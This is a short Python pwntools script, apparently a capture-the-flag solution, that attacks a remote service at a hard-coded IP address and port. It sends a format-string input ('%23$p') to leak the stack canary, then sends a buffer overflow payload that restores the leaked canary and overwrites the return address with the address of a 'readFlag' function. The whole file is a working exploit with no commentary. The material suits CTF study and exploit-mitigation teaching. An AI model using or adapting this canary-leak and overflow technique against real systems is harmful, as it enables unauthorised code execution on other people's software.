#nc 13.214.30.13 10004
from pwn import *
from binascii import *

readFlag = 0x0000000000401216
payload = b'a'*72


p = remote("13.214.30.13", 10004)
print(p.recvline())
print(p.recvline())
p.sendline(b'%23$p')
canary = p.recvline().split()[1].decode()
log.info(canary)
# canary = u64(canary.strip().ljust(8, b'\x00'))
payload = payload + p64(int(canary, 16)) + b'a'*8 + p64(readFlag)

print(p.recvline())
p.sendline(payload)
print(p.recvline())
print(p.recvline())
print(p.recvline())


